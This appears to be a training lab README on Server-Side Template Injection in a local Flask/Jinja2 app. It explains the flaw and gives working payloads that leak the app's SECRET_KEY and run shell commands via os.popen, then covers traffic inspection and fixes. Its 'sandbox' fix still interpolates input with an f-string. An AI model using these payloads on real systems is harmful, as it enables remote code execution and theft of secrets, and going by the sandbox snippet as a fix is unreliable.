# Lab 09 — SSTI (Server-Side Template Injection)

## 📖 Explanation

**SSTI (Server-Side Template Injection)** occurs when user input is
embedded directly into a template string that the server-side template
engine processes.

In Flask, the Jinja2 template engine evaluates expressions inside `{{ }}`.
If user input is placed into a template *before* rendering, the attacker can
inject Jinja2 syntax to execute arbitrary Python code.

### The vulnerable code

```python
template = f"<h2>Hello, {name}!</h2><p>Welcome to the portal.</p>"
return render_template_string(template, user=user)
```

The `name` parameter is interpolated into the template string via f-string
*before* `render_template_string` processes it. If `name` contains `{{ }}`,
Jinja2 will evaluate it.

---

## 🎯 Try It

### 1. Normal usage

Visit: `http://127.0.0.1:15000/greet?name=Alice`

You see: **Hello, Alice!**

### 2. Basic SSTI — evaluate an expression

Visit: `http://127.0.0.1:15000/greet?name={{7*7}}`

You see: **Hello, 49!**

Jinja2 evaluated `7*7` and inserted `49`.

### 3. Access Python builtins

Visit: `http://127.0.0.1:15000/greet?name={{config}}`

You see the Flask app configuration object — including `SECRET_KEY`!

### 4. Execute system commands (read files)

Try this URL (URL-encoded):

```
http://127.0.0.1:15000/greet?name={{''.__class__.__mro__[1].__subclasses__()}}
```

This uses Python's MRO (Method Resolution Order) to find `object`, then
lists all subclasses of `object` in the Python runtime. Among them is
`subprocess.Popen` or `os._wrap_close` that can be used for RCE.

A known working payload for Flask/Jinja2:

```
http://127.0.0.1:15000/greet?name={{''.__class__.__mro__[1].__subclasses__()[X]}}
```

Where `[X]` is the index of a class with access to `os` or `subprocess`.
The index varies by Python version and installed packages.

**Simpler approach — access `os` via `config`:**

```
http://127.0.0.1:15000/greet?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

This demonstrates **Remote Code Execution (RCE)** through SSTI.

### 5. Read app source

```
http://127.0.0.1:15000/greet?name={{config.__class__.__init__.__globals__['os'].popen('cat app.py').read()}}
```

---

## 🔍 Packet Inspection with mitmproxy

SSTI is uniquely visible because the **request URL** contains Jinja2 syntax
and the **response body** shows the evaluated result.

### What to look for

**1. Normal greeting**

```http
GET /greet?name=Alice HTTP/1.1
Host: 127.0.0.1:15000
```

Response:
```html
<h2>Hello, Alice!</h2><p>Welcome to the portal.</p>
```

**2. SSTI probe**

```http
GET /greet?name=%7B%7B7*7%7D%7D HTTP/1.1
Host: 127.0.0.1:15000
```

Decoded query: `name={{7*7}}`

Response:
```html
<h2>Hello, 49!</h2><p>Welcome to the portal.</p>
```

**This is the proof** — `49` means the Jinja2 engine evaluated `7*7`.
If the app were secure, the response would contain the literal string
`{{7*7}}`.

**3. Leaking `config`**

```http
GET /greet?name=%7B%7Bconfig%7D%7D HTTP/1.1
```

Response contains the entire Flask config, including `SECRET_KEY`:

```
<Config {'ENV': ... 'SECRET_KEY': 'insecure-secret-key' ...}>
```

**4. RCE — reading `/etc/passwd`**

Watch the request with full os.popen payload and see system files in the
response. Compare the response size — it jumps from ~100 bytes to multiple
KB.

### Request → Response size comparison

| Payload | Request size | Response size | Meaning |
|---------|-------------|--------------|---------|
| `Alice` | ~50 bytes | ~100 bytes | Normal |
| `{{7*7}}` | ~60 bytes | ~100 bytes | Arithmetic eval |
| `{{config}}` | ~70 bytes | ~500 bytes | Configuration leak |
| Full RCE | ~200 bytes | ~2 KB+ | File content in response |

The size jump alone is a suspicious signal.

### Use the addon

```bash
uv run mitmweb -s mitm_addon.py    # identical in PowerShell — uv resolves the venv
```

The addon tags requests to `/greet` containing `{{ }}` patterns and logs
when SSTI is confirmed (response contains `Hello, {evaluated}`).

---

## 🛡️ Hardening

### Fix 1 — Never interpolate user input into the template string

**Vulnerable:**
```python
template = f"<h2>Hello, {name}!</h2>"
return render_template_string(template)
```

**Fixed — pass input as a template variable:**
```python
return render_template("greet.html", name=name)
```

And in the template file (`greet.html`):
```html
<h2>Hello, {{ name }}!</h2>
```

Now Jinja2 properly escapes the value. Even if the user enters `{{7*7}}`,
it is rendered as the literal string `{{7*7}}`, not evaluated.

### Fix 2 — Use `render_template` (file-based) instead of `render_template_string`

File-based templates are **static** — you control the template code.
`render_template_string` should only be used when the template itself is
dynamically generated from trusted sources.

### Fix 3 — Sanitise input (but never rely on this alone)

```python
import re
if re.search(r'{{|{%|{#', name):
    return "Invalid input", 400
```

This is easily bypassed and should only be a defence-in-depth layer.

### Fix 4 — Sandbox the template environment

```python
from jinja2 import Environment, BaseLoader, select_autoescape

env = Environment(
    loader=BaseLoader(),
    autoescape=select_autoescape(['html', 'xml']),
    # Restrict builtins
)

template = env.from_string(f"<h2>Hello, {name}!</h2>")
return template.render()
```

This doesn't prevent SSTI entirely but limits available objects.

### Fix 5 — Drop user-provided template rendering entirely

If there's no legitimate use case for user-controlled templates, disable
the feature. Many applications never need `render_template_string` at all.

### Key takeaway

> Never embed user input into template source code. Pass it as a variable
> to the template engine and let the engine handle escaping.